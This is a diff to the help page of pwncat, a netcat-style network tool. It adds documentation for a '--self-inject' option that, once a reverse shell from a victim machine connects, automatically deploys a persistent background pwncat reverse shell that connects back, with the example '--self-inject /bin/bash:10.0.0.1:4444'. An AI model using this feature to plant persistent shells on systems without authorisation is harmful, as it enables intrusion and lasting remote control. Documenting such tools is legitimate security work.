@@ -133,6 +133,21 @@ optional arguments:
                         color on Windows by default. (default: auto)
 
 </code></pre>
+command & control arguments:
+  --self-inject cmd:host:port
+                        Listen mode (TCP only):
+                        If you are about to inject a reverse shell onto the
+                        victim machine (via php, bash, nc, ncat or similar),
+                        start your listening server with this argument.
+                        This will then (as soon as the reverse shell connects)
+                        automatically deploy and background-run an unbreakable
+                        pwncat reverse shell onto the victim machine which then
+                        also connects back to you with specified arguments.
+                        Example: '--self-inject /bin/bash:10.0.0.1:4444'
+                        Note: this is currently an experimental feature and does
+                        not work on Windows remote hosts yet.
+
+</code></pre>
 <pre class="hi"><code>
 advanced arguments:
   --script-send file    All modes (TCP and UDP):
